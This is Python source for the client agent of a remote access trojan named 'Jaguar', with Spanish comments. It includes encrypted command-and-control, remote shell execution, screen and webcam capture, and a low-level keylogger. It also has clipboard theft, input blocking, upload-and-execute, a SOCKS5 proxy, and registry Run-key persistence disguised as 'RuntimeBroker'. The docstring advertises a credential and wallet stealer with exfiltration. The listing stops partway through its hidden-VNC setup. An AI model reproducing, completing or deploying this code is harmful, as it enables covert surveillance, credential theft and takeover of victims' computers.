# -*- coding: utf-8 -*-
"""Agente Jaguar - payload cliente (v2).

Protocolo IDENTICO al controlador (jaguar/server/sesion.py + jaguar/common/cripto.py):
  - framing: 4 bytes big-endian (longitud) + payload CIFRADO
  - payload: JSON cifrado con cifrar()/descifrar()
  - handshake agente->servidor: {"tipo":"hola","info":{...}}
  - servidor->agente: {"tipo":"comando","cmd":...,"args":...} | {"tipo":"beacon",...}
  - agente->servidor: {"tipo":"respuesta","cmd":...,"ok":...,"datos":...}
  - agente->servidor (push): {"tipo":"evento","evento":"hvnc_frame"|"escritorio_frame","datos":{...}}

NOVEDADES v2
  - TCP_NODELAY + envio con lock -> HVNC fluido por WAN.
  - HVNC por PID del proceso lanzado (fix Chrome/Edge/Brave), render-widget dedicado,
    activacion WM_ACTIVATE/WM_SETFOCUS, triple fallback de captura, cache GDI.
  - Stream push (hvnc_stream / captura_stream): cero round-trip por frame.
  - STEALER estilo PureLogs embebido: navegadores (passwords, cookies, autofill,
    tarjetas, historial, bookmarks), wallets, apps (FTP/SSH/mail/VPN/mensajeria),
    WiFi, sistema, portapapeles, screenshot, keylogger -> ZIP -> exfiltracion.
  - AES-256-GCM/CBC + 3DES en Python puro (sin cryptography).
"""
import base64
import hashlib
import hmac
import io
import json
import os
import platform
import random
import shutil
import socket
import sqlite3
import struct
import subprocess
import sys
import tempfile
import threading
import time
import zipfile

try:
    import getpass
except Exception:
    getpass = None

HOST = os.environ.get("JAGUAR_HOST", "127.0.0.1")
try:
    PORT = int(os.environ.get("JAGUAR_PORT", "8000"))
except Exception:
    PORT = 8000
FALLBACK = os.environ.get("JAGUAR_HOST2", "")
SLEEP = 3.0
JITTER = 0.2
NOMBRE = "RuntimeBroker"
_WIN = platform.system() == "Windows"

CREATE_NO_WINDOW = 0x08000000

DIR_PERSIST = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
                           "Microsoft", "Windows", NOMBRE)

_KLOG = []
_KLOG_ON = False
_PROXY_ON = False
_SALIR = False
_BLOQ = {"on": False}
_WCAM = {"on": False, "frame": b"", "w": 0, "h": 0}
_CAP_CFG = {"calidad": 70, "escala": 1.0}

_LOCK_ENVIO = threading.Lock()
_SOCK_ACT = {"s": None}

_TEMP_STEAL = None


def _sin_consola():
    if not _WIN:
        return {}
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0
    return {"startupinfo": si, "creationflags": CREATE_NO_WINDOW}


# ====================== CRIPTO (idéntico a jaguar/common/cripto.py) ==========
_K_OBF = bytes([
    0x10, 0x6E, 0x1D, 0x0F, 0x6E, 0x08, 0x77, 0x68, 0x6A, 0x68,
    0x6C, 0x77, 0x39, 0x36, 0x3B, 0x2C, 0x3F, 0x77, 0x39, 0x35,
    0x37, 0x2A, 0x3B, 0x28, 0x2E, 0x33, 0x3E, 0x3B,
])
_CLAVE_MAESTRA = bytes(b ^ 0x5A for b in _K_OBF)
_SAL = b"jaguar-v1"
_ITER = 100_000
_CI = None
_MA = None


def _cinit():
    global _CI, _MA
    if _CI is None:
        m = hashlib.pbkdf2_hmac("sha256", _CLAVE_MAESTRA, _SAL, _ITER, dklen=64)
        _CI, _MA = m[:32], m[32:]


def _ks(nonce, n):
    _cinit()
    out = bytearray()
    c = 0
    while len(out) < n:
        out += hmac.new(_CI, nonce + struct.pack(">Q", c), hashlib.sha256).digest()
        c += 1
    return bytes(out[:n])


def _xor(a, b):
    if not a:
        return b""
    return (int.from_bytes(a, "big") ^ int.from_bytes(b, "big")).to_bytes(len(a), "big")


def cifrar(datos):
    _cinit()
    if isinstance(datos, str):
        datos = datos.encode("utf-8")
    pad = os.urandom(os.urandom(1)[0])
    cuerpo = struct.pack(">H", len(pad)) + pad + datos
    nonce = os.urandom(16)
    ct = _xor(cuerpo, _ks(nonce, len(cuerpo)))
    mac = hmac.new(_MA, nonce + ct, hashlib.sha256).digest()
    return nonce + ct + mac


def descifrar(blob):
    _cinit()
    if len(blob) < 48:
        raise ValueError("trama corta")
    nonce, ct, mac = blob[:16], blob[16:-32], blob[-32:]
    if not hmac.compare_digest(mac, hmac.new(_MA, nonce + ct, hashlib.sha256).digest()):
        raise ValueError("MAC inválido")
    cuerpo = _xor(ct, _ks(nonce, len(ct)))
    return cuerpo[2 + struct.unpack(">H", cuerpo[:2])[0]:]
# ============================================================================


def _recv(sock, n):
    b = b""
    while len(b) < n:
        c = sock.recv(n - len(b))
        if not c:
            return None
        b += c
    return b


def _enviar(sock, obj):
    d = json.dumps(obj, ensure_ascii=False).encode("utf-8")
    c = cifrar(d)
    paquete = struct.pack(">I", len(c)) + c
    with _LOCK_ENVIO:
        sock.sendall(paquete)


def _enviar_evento(evento, datos):
    s = _SOCK_ACT.get("s")
    if not s:
        return
    try:
        _enviar(s, {"tipo": "evento", "evento": evento, "datos": datos})
    except Exception:
        pass


def _recibir(sock):
    cab = _recv(sock, 4)
    if not cab:
        return None
    (n,) = struct.unpack(">I", cab)
    d = _recv(sock, n)
    if d is None:
        return None
    try:
        return json.loads(descifrar(d).decode("utf-8"))
    except Exception:
        return {}


# ============================ LOG persistente ===============================
DIR_LOG = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
                       "Microsoft", "Windows", NOMBRE)
RUTA_LOG = os.path.join(DIR_LOG, "jaguar.log")
_MAX_LOG = 1_000_000


def _log(nivel, txt):
    try:
        os.makedirs(DIR_LOG, exist_ok=True)
        if os.path.isfile(RUTA_LOG) and os.path.getsize(RUTA_LOG) > _MAX_LOG:
            try:
                os.replace(RUTA_LOG, RUTA_LOG + ".1")
            except Exception:
                pass
        with open(RUTA_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [{nivel}] {txt}\n")
    except Exception:
        pass


def _log_leer(a):
    n = int(a.get("lineas", 200))
    try:
        with open(RUTA_LOG, encoding="utf-8", errors="replace") as f:
            return {"ruta": RUTA_LOG, "texto": "".join(f.readlines()[-n:])}
    except Exception as e:
        return {"error": str(e), "ruta": RUTA_LOG}
# ============================================================================


def _cfg():
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    try:
        puerto = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    except Exception:
        puerto = PORT
    fb = sys.argv[3] if len(sys.argv) > 3 else FALLBACK
    return (host or "127.0.0.1"), puerto, (fb or "")


def _ip_interna():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def _usuario():
    try:
        return getpass.getuser() if getpass else (os.environ.get("USERNAME") or "?")
    except Exception:
        return os.environ.get("USERNAME") or "?"


def _sysinfo():
    return {
        "host": socket.gethostname(),
        "usuario": _usuario(),
        "so": f"{platform.system()} {platform.release()}",
        "arquitectura": platform.machine(),
        "ip": _ip_interna(),
        "pid": os.getpid(),
        "exe": sys.executable,
        "cwd": os.getcwd(),
    }


# ------------------------------------------------------------------ handlers
def _ping(a):
    return {"ts": a.get("ts")}


def _shell(a):
    r = subprocess.run(a.get("comando", ""), shell=True, capture_output=True,
                       text=True, **_sin_consola())
    return {"salida": (r.stdout or "") + (r.stderr or ""), "codigo": r.returncode}


def _listar_dir(a):
    ruta = a.get("ruta", ".") or "."
    try:
        items = []
        for e in os.scandir(ruta):
            try:
                items.append({"nombre": e.name, "dir": e.is_dir(), "tamano": e.stat().st_size})
            except Exception:
                items.append({"nombre": e.name, "dir": e.is_dir(), "tamano": 0})
        return {"ruta": os.path.abspath(ruta), "items": items}
    except Exception as e:
        return {"error": str(e)}


def _procesos(a):
    try:
        r = (subprocess.run(["tasklist"], capture_output=True, text=True, **_sin_consola())
             if _WIN else subprocess.run(["ps", "aux"], capture_output=True, text=True))
        return {"salida": r.stdout}
    except Exception as e:
        return {"error": str(e)}


def _captura(a):
    fmt = (a.get("formato") or "png").lower()
    calidad = int(a.get("calidad", _CAP_CFG["calidad"]))
    escala = float(a.get("escala", _CAP_CFG["escala"])) or 1.0
    try:
        from PIL import ImageGrab
        try:
            img = ImageGrab.grab(all_screens=True)
        except TypeError:
            img = ImageGrab.grab()
    except Exception:
        img = None
    if img is None:
        return _captura_win(a)
    w, h = img.width, img.height
    if escala != 1.0:
        img = img.resize((max(1, int(w * escala)), max(1, int(h * escala))))
    buf = io.BytesIO()
    try:
        if fmt == "jpeg":
            img.convert("RGB").save(buf, "JPEG", quality=calidad)
        else:
            img.save(buf, "PNG")
    except Exception as e:
        return {"b64": "", "error": str(e)}
    return {"b64": base64.b64encode(buf.getvalue()).decode(), "w": w, "h": h}


def _captura_win(a):
    import ctypes
    from ctypes import wintypes
    u = ctypes.windll.user32
    g = ctypes.windll.gdi32
    hwnd = u.GetDesktopWindow()
    hdc = u.GetWindowDC(hwnd)
    w = u.GetSystemMetrics(0)
    h = u.GetSystemMetrics(1)
    memdc = g.CreateCompatibleDC(hdc)
    bmp = g.CreateCompatibleBitmap(hdc, w, h)
    g.SelectObject(memdc, bmp)
    g.BitBlt(memdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)

    class BIH(ctypes.Structure):
        _fields_ = [("biSize", wintypes.DWORD), ("biWidth", wintypes.LONG),
                    ("biHeight", wintypes.LONG), ("biPlanes", wintypes.WORD),
                    ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                    ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", wintypes.LONG),
                    ("biYPelsPerMeter", wintypes.LONG), ("biClrUsed", wintypes.DWORD),
                    ("biClrImportant", wintypes.DWORD)]

    bi = BIH()
    bi.biSize = ctypes.sizeof(BIH)
    bi.biWidth = w
    bi.biHeight = -h
    bi.biPlanes = 1
    bi.biBitCount = 32
    buf = ctypes.create_string_buffer(w * h * 4)
    g.GetDIBits(memdc, bmp, 0, h, buf, ctypes.byref(bi), 0)
    g.DeleteObject(bmp)
    g.DeleteDC(memdc)
    u.ReleaseDC(hwnd, hdc)
    try:
        from PIL import Image
        img = Image.frombuffer("RGBA", (w, h), buf, "raw", "BGRA", 0, 1)
        b = io.BytesIO()
        img.convert("RGB").save(b, "PNG")
        return {"b64": base64.b64encode(b.getvalue()).decode(), "w": w, "h": h}
    except Exception:
        return {"b64": "", "w": w, "h": h}


def _raton(a):
    if not _WIN:
        return {}
    import ctypes
    u = ctypes.windll.user32
    accion = a.get("accion")
    if "x" in a and "y" in a:
        u.SetCursorPos(int(a["x"]), int(a["y"]))
    if accion == "down":
        u.mouse_event(0x0002, 0, 0, 0, 0)
    elif accion == "up":
        u.mouse_event(0x0004, 0, 0, 0, 0)
    elif accion == "right_down":
        u.mouse_event(0x0008, 0, 0, 0, 0)
    elif accion == "right_up":
        u.mouse_event(0x0010, 0, 0, 0, 0)
    elif accion == "doble":
        for _ in range(2):
            u.mouse_event(0x0002, 0, 0, 0, 0)
            u.mouse_event(0x0004, 0, 0, 0, 0)
    elif accion == "scroll":
        u.mouse_event(0x0800, 0, 0, int(a.get("delta", 120)), 0)
    return {}


_SWAP = {"on": False}


def _swap_raton(a):
    if not _WIN:
        return {}
    import ctypes
    _SWAP["on"] = not _SWAP["on"]
    ctypes.windll.user32.SwapMouseButton(1 if _SWAP["on"] else 0)
    return {"estado": "swap", "on": _SWAP["on"]}


def _teclado(a):
    if not _WIN:
        return {}
    import ctypes
    u = ctypes.windll.user32
    UP, UNI = 0x0002, 0x0004
    if "vk" in a:
        vk = int(a["vk"])
        u.keybd_event(vk, 0, 0, 0)
        u.keybd_event(vk, 0, UP, 0)
    elif "texto" in a:
        for ch in a["texto"]:
            u.keybd_event(0, ord(ch), UNI, 0)
            u.keybd_event(0, ord(ch), UNI | UP, 0)
    return {}


def _bloquear(a):
    if not _WIN:
        return {}
    import ctypes
    _BLOQ["on"] = not _BLOQ["on"]
    try:
        ctypes.windll.user32.BlockInput(_BLOQ["on"])
    except Exception:
        pass
    return {"bloqueado": _BLOQ["on"]}


def _clip_get(a):
    if not _WIN:
        return {"texto": ""}
    import ctypes
    u = ctypes.windll.user32
    k = ctypes.windll.kernel32
    CF_UNICODETEXT = 13
    if not u.OpenClipboard(0):
        return {"texto": ""}
    try:
        h = u.GetClipboardData(CF_UNICODETEXT)
        if not h:
            return {"texto": ""}
        p = k.GlobalLock(h)
        txt = ctypes.wstring_at(p) if p else ""
        k.GlobalUnlock(h)
        return {"texto": txt}
    finally:
        u.CloseClipboard()


def _clip_set(a):
    if not _WIN:
        return {}
    import ctypes
    u = ctypes.windll.user32
    k = ctypes.windll.kernel32
    CF_UNICODETEXT = 13
    GMEM_MOVEABLE = 0x0002
    txt = str(a.get("texto", ""))
    if not u.OpenClipboard(0):
        return {}
    try:
        u.EmptyClipboard()
        datos = (txt + "\x00").encode("utf-16-le")
        h = k.GlobalAlloc(GMEM_MOVEABLE, len(datos))
        p = k.GlobalLock(h)
        ctypes.memmove(p, datos, len(datos))
        k.GlobalUnlock(h)
        u.SetClipboardData(CF_UNICODETEXT, h)
    finally:
        u.CloseClipboard()
    return {"ok": True}


def _webcam(a):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ok, frame = cap.read()
        cap.release()
        if not ok:
            return {"b64": ""}
        ok, buf = cv2.imencode(".jpg", frame)
        return {"b64": base64.b64encode(buf.tobytes()).decode(),
                "w": frame.shape[1], "h": frame.shape[0]}
    except Exception as e:
        return {"b64": "", "error": str(e)}


def _webcam_iniciar(a):
    if _WCAM["on"]:
        return {"estado": "ya activo"}
    _WCAM["on"] = True
    threading.Thread(target=_wcam_loop, args=(int(a.get("cam", 0)),), daemon=True).start()
    return {"estado": "iniciado"}


def _wcam_loop(idx):
    try:
        import cv2
    except Exception:
        _WCAM["on"] = False
        return
    cap = cv2.VideoCapture(idx)
    while _WCAM["on"]:
        try:
            ok, frame = cap.read()
            if ok:
                ok2, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                if ok2:
                    _WCAM["frame"] = buf.tobytes()
                    _WCAM["w"], _WCAM["h"] = frame.shape[1], frame.shape[0]
        except Exception:
            pass
        time.sleep(0.03)
    cap.release()


def _webcam_frame(a):
    return {"b64": base64.b64encode(_WCAM["frame"]).decode() if _WCAM["frame"] else "",
            "w": _WCAM["w"], "h": _WCAM["h"]}


def _webcam_parar(a):
    _WCAM["on"] = False
    return {"estado": "parado"}


# ============================== KEYLOGGER ==================================
_VK_ESP = {0x20: " ", 0x0D: "\n", 0x08: "[BS]", 0x09: "[TAB]", 0x1B: "[ESC]",
           0x2E: "[DEL]", 0x21: "[PGUP]", 0x22: "[PGDN]", 0x23: "[END]",
           0x24: "[HOME]", 0x25: "[<]", 0x26: "[^]", 0x27: "[>]", 0x28: "[v]",
           0x14: "[CAPS]", 0x5B: "[WIN]"}
_VK_SHIFT = {0x31: "!", 0x32: "@", 0x33: "#", 0x34: "$", 0x35: "%", 0x36: "^",
             0x37: "&", 0x38: "*", 0x39: "(", 0x30: ")", 0xBD: "_", 0xBB: "+",
             0xBC: "<", 0xBE: ">", 0xBF: "?", 0xBA: ":", 0xDE: '"', 0xDB: "{",
             0xDD: "}", 0xDC: "|", 0xC0: "~", 0xC1: "~"}
_VK_PLAIN = {0xBD: "-", 0xBB: "=", 0xBC: ",", 0xBE: ".", 0xBF: "/", 0xBA: ";",
             0xDE: "'", 0xDB: "[", 0xDD: "]", 0xDC: "\\", 0xC0: "`"}


def _vk_texto(vk):
    if vk in _VK_ESP:
        return _VK_ESP[vk]
    try:
        import ctypes
        u = ctypes.windll.user32
        shift = bool(u.GetKeyState(0x10) & 0x8000)
        caps = bool(u.GetKeyState(0x14) & 1)
    except Exception:
        shift, caps = False, False
    if 65 <= vk <= 90:
        letra = chr(vk) if (shift ^ caps) else chr(vk + 32)
        return letra
    if 48 <= vk <= 57:
        return _VK_SHIFT.get(vk, chr(vk)) if shift else chr(vk)
    if vk in _VK_PLAIN:
        return _VK_SHIFT.get(vk, _VK_PLAIN[vk]) if shift else _VK_PLAIN[vk]
    if 0x60 <= vk <= 0x69:
        return str(vk - 0x60)
    if 0x70 <= vk <= 0x7B:
        return f"[F{vk - 0x6F}]"
    return ""


_KLOG_HOOK = {"activo": False}


def _keylogger_iniciar(a):
    global _KLOG_ON
    if _KLOG_ON:
        return {"estado": "ya activo"}
    _KLOG_ON = True
    if _WIN:
        threading.Thread(target=_klog_hook_loop, daemon=True).start()
    threading.Thread(target=_klog_loop, daemon=True).start()
    return {"estado": "iniciado"}


def _klog_hook_loop():
    """Hook de bajo nivel WH_KEYBOARD_LL (silencioso, capta teclas fisicas)."""
    import ctypes
    from ctypes import wintypes
    u = ctypes.windll.user32
    k = ctypes.windll.kernel32

    class KBDLLHOOKSTRUCT(ctypes.Structure):
        _fields_ = [("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
                    ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
                    ("dwExtraInfo", ctypes.c_void_p)]

    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_int,
                                  wintypes.WPARAM, wintypes.LPARAM)

    def _proc(nCode, wParam, lParam):
        try:
            if nCode == 0 and wParam in (0x0100, 0x0104):
                kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                txt = _vk_texto(int(kb.vkCode))
                if txt:
                    _KLOG.append(txt)
                    if len(_KLOG) > 40000:
                        del _KLOG[:-20000]
        except Exception:
            pass
        return u.CallNextHookEx(None, nCode, wParam, lParam)

    proc = HOOKPROC(_proc)
    h = u.SetWindowsHookExW(13, proc, k.GetModuleHandleW(None), 0)
    if not h:
        return
    _KLOG_HOOK["activo"] = True
    msg = wintypes.MSG()
    while _KLOG_ON:
        try:
            if u.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
                u.TranslateMessage(ctypes.byref(msg))
                u.DispatchMessageW(ctypes.byref(msg))
            else:
                time.sleep(0.004)
        except Exception:
            break
    try:
        u.UnhookWindowsHookEx(h)
    except Exception:
        pass
    _KLOG_HOOK["activo"] = False


def _klog_loop():
    """Respaldo por sondeo si el hook no esta activo."""
    if not _WIN:
        return
    import ctypes
    u = ctypes.windll.user32
    while _KLOG_ON:
        if not _KLOG_HOOK["activo"]:
            for vk in range(8, 256):
                if u.GetAsyncKeyState(vk) & 1:
                    txt = _vk_texto(vk)
                    if txt:
                        _KLOG.append(txt)
        time.sleep(0.02)


def _keylogger_leer(a):
    global _KLOG
    txt = "".join(_KLOG)
    _KLOG = []
    return {"texto": txt, "hook": _KLOG_HOOK["activo"]}


def _persistir(a):
    try:
        os.makedirs(DIR_PERSIST, exist_ok=True)
        if getattr(sys, "frozen", False):
            origen = os.path.abspath(sys.executable)
            destino = os.path.join(DIR_PERSIST, os.path.basename(origen))
            arranque = f'"{destino}"'
        else:
            origen = os.path.abspath(sys.argv[0])
            destino = os.path.join(DIR_PERSIST, os.path.basename(origen))
            arranque = f'"{sys.executable}" "{destino}"'
        if origen.lower() != destino.lower():
            shutil.copy2(origen, destino)
        host, puerto, fb = _cfg()
        arranque += f" {host} {puerto} {fb}"
        if _WIN:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, NOMBRE, 0, winreg.REG_SZ, arranque)
            winreg.CloseKey(k)
            _log("PERSIST", f"instalada -> {destino}")
            return {"persistencia": f"HKCU\\...\\Run[{NOMBRE}]", "copia": destino}
        return {"persistencia": "cron (no-op)", "copia": destino}
    except Exception as e:
        _log("PERSIST", f"error: {e}")
        return {"error": str(e)}


def _abrir_url(a):
    try:
        if _WIN:
            os.startfile(a.get("url", ""))
        else:
            subprocess.Popen(["xdg-open", a.get("url", "")])
    except Exception:
        pass
    return {}


def _mensaje(a):
    if _WIN:
        import ctypes
        txt = a.get("texto", "")
        threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, txt, "Jaguar", 0x40),
                         daemon=True).start()
    return {}


def _descargar(a):
    with open(a.get("ruta", ""), "rb") as f:
        d = f.read()
    return {"nombre": os.path.basename(a.get("ruta", "")),
            "b64": base64.b64encode(d).decode(), "tamano": len(d)}


def _subir_ejecutar(a):
    d = base64.b64decode(a.get("b64", ""))
    ruta = os.path.join(tempfile.gettempdir(), a.get("nombre", "archivo.bin"))
    with open(ruta, "wb") as f:
        f.write(d)
    try:
        subprocess.Popen([ruta], shell=True, **_sin_consola())
    except Exception:
        pass
    return {"ruta": ruta}


def _proxy_iniciar(a):
    global _PROXY_ON
    if _PROXY_ON:
        return {"estado": "ya activo"}
    _PROXY_ON = True
    threading.Thread(target=_socks_loop, args=(int(a.get("puerto", 1080)),), daemon=True).start()
    return {"estado": "proxy SOCKS5 activo"}


def _proxy_parar(a):
    global _PROXY_ON
    _PROXY_ON = False
    return {"estado": "parado"}


def _socks_loop(puerto):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", puerto))
    srv.listen(20)
    while _PROXY_ON:
        try:
            cli, _ = srv.accept()
        except OSError:
            break
        threading.Thread(target=_socks_atender, args=(cli,), daemon=True).start()


def _socks_atender(cli):
    try:
        cli.recv(2)
        cli.sendall(b"\x05\x00")
        _, _, _, atyp = cli.recv(4)
        if atyp == 1:
            host = socket.inet_ntoa(cli.recv(4))
        elif atyp == 3:
            host = cli.recv(cli.recv(1)[0]).decode()
        else:
            host = socket.inet_ntoa(cli.recv(4))
        puerto = struct.unpack(">H", cli.recv(2))[0]
        remoto = socket.socket()
        remoto.connect((host, puerto))
        cli.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + b"\x00\x00")
        _relay(cli, remoto)
    except Exception:
        try:
            cli.close()
        except Exception:
            pass


def _relay(a, b):
    def bombea(src, dst):
        try:
            while True:
                d = src.recv(65536)
                if not d:
                    break
                dst.sendall(d)
        except Exception:
            pass
        try:
            dst.close()
        except Exception:
            pass
    threading.Thread(target=bombea, args=(a, b), daemon=True).start()
    threading.Thread(target=bombea, args=(b, a), daemon=True).start()


def _desconectar(a):
    global _SALIR
    _SALIR = True
    return {"estado": "adios"}


# ================================== HVNC ====================================
if _WIN:
    import ctypes
    from ctypes import wintypes
    try:
        ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass
    _u32 = ctypes.windll.user32
    _k32 = ctypes.windll.kernel32
    _g32 = ctypes.windll.gdi32
    _advapi32 = ctypes.windll.advapi32

    DESKTOP_ALL = 0x01FF
    DESKTOP_ACCESS = 0x000F0000 | DESKTOP_ALL
    DESKTOP_NAME = "JaguarHVNC"
    PW_RENDERFULLCONTENT = 0x00000002
    _CLASES_BROWSER = ("Chrome_WidgetWin_1", "Chrome_WidgetWin_0",
                       "MozillaWindowClass", "ApplicationFrameWindow")
    _CLASES_RENDER = ("Chrome_RenderWidgetHostHWND", "Intermediate D3D Window",
                      "MozillaWindowClass", "Chrome_WidgetWin_1")

    class _STARTUPINFOW(ctypes.Structure):
        _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
                    ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
                    ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
                    ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
                    ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
                    ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
                    ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
                    ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
                    ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE),
                    ("hStdError", wintypes.HANDLE)]

    class _PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                    ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]

    class _RECT(ctypes.Structure):
        _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                    ("right", ctypes.c_long), ("bottom", ctypes.c_long)]

    class _POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

    class _BIH(ctypes.Structure):
        _fields_ = [("biSize", wintypes.DWORD), ("biWidth", ctypes.c_long),
                    ("biHeight", ctypes.c_long), ("biPlanes", wintypes.WORD),
                    ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                    ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", ctypes.c_long),
                    ("biYPelsPerMeter", ctypes.c_long), ("biClrUsed", wintypes.DWORD),
                    ("biClrImportant", wintypes.DWORD)]

    class _BITMAPINFO(ctypes.Structure):
        _fields_ = [("bmiHeader", _BIH), ("bmiColors", wintypes.DWORD * 3)]

    class _SECURITY_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("nLength", wintypes.DWORD),
                    ("lpSecurityDescriptor", ctypes.c_void_p),
                    ("bInheritHandle", wintypes.BOOL)]

    class _SECURITY_DESCRIPTOR(ctypes.Structure):
        _fields_ = [("Revision", ctypes.c_ubyte), ("Sbz1", ctypes.c_ubyte),
                    ("Control", wintypes.WORD), ("Owner", ctypes.c_void_p),
                    ("Group", ctypes.c_void_p), ("Sacl", ctypes.c_void_p),
                    ("Dacl", ctypes.c_void_p)]

    class _GUITHREADINFO(ctypes.Structure):
        _fields_ = [("cbSize", wintypes.DWORD), ("flags", wintypes.DWORD),
                    ("hwndActive", wintypes.HWND), ("hwndFocus", wintypes.HWND),
                    ("hwndCapture", wintypes.HWND), ("hwndMenuOwner", wintypes.HWND),
                    ("hwndMoveSize", wintypes.HWND), ("hwndCaret", wintypes.HWND),
                    ("rcCaret", _RECT)]

    _u32.CreateDesktopW.restype = wintypes.HANDLE
    _u32.CreateDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.c_void_p,
                                    wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
    _u32.OpenDesktopW.restype = wintypes.HANDLE
    _u32.OpenDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.BOOL,
                                  wintypes.DWORD]
    _u32.CloseDesktop.argtypes = [wintypes.HANDLE]
    _u32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
    _u32.SetThreadDesktop.restype = wintypes.BOOL
    _u32.EnumDesktopWindows.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.LPARAM]
    _u32.EnumChildWindows.argtypes = [wintypes.HWND, ctypes.c_void_p, wintypes.LPARAM]
    _u32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(_RECT)]
    _u32.GetClassNameW.argtypes = [wintypes.HWND, wintypes.LPWSTR, ctypes.c_int]
    _u32.GetWindowDC.argtypes = [wintypes.HWND]
    _u32.GetWindowDC.restype = wintypes.HDC
    _u32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
    _u32.PrintWindow.argtypes = [wintypes.HWND, wintypes.HDC, wintypes.UINT]
    _u32.ScreenToClient.argtypes = [wintypes.HWND, ctypes.POINTER(_POINT)]
    _u32.ClientToScreen.argtypes = [wintypes.HWND, ctypes.POINTER(_POINT)]
    _u32.PostMessageW.argtypes = [wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
    _u32.MapVirtualKeyW.argtypes = [wintypes.UINT, wintypes.UINT]
    _u32.ChildWindowFromPointEx.argtypes = [wintypes.HWND, _POINT, wintypes.UINT]
    _u32.ChildWindowFromPointEx.restype = wintypes.HWND
    _u32.MapWindowPoints.argtypes = [wintypes.HWND, wintypes.HWND,
                                     ctypes.POINTER(_POINT), wintypes.UINT]
    _u32.GetGUIThreadInfo.argtypes = [wintypes.DWORD, ctypes.c_void_p]
    _u32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
    _u32.GetWindowThreadProcessId.restype = wintypes.DWORD
    _k32.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.c_void_p,
                                    ctypes.c_void_p, wintypes.BOOL, wintypes.DWORD,
                                    ctypes.c_void_p, wintypes.LPCWSTR,
                                    ctypes.POINTER(_STARTUPINFOW),
                                    ctypes.POINTER(_PROCESS_INFORMATION)]
    _k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
    _k32.GetExitCodeProcess.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
    _k32.GlobalAlloc.argtypes = [wintypes.UINT, ctypes.c_size_t]
    _k32.GlobalAlloc.restype = ctypes.c_void_p
    _k32.GlobalLock.argtypes = [ctypes.c_void_p]
    _k32.GlobalLock.restype = ctypes.c_void_p
    _g32.CreateCompatibleDC.argtypes = [wintypes.HDC]
    _g32.CreateCompatibleDC.restype = wintypes.HDC
    _g32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
    _g32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
    _g32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
    _g32.GetDIBits.argtypes = [wintypes.HDC, wintypes.HBITMAP, wintypes.UINT, wintypes.UINT,
                               ctypes.c_void_p, ctypes.POINTER(_BITMAPINFO), wintypes.UINT]
    _g32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
    _g32.DeleteDC.argtypes = [wintypes.HDC]
    _u32.SetClipboardData.argtypes = [wintypes.UINT, ctypes.c_void_p]
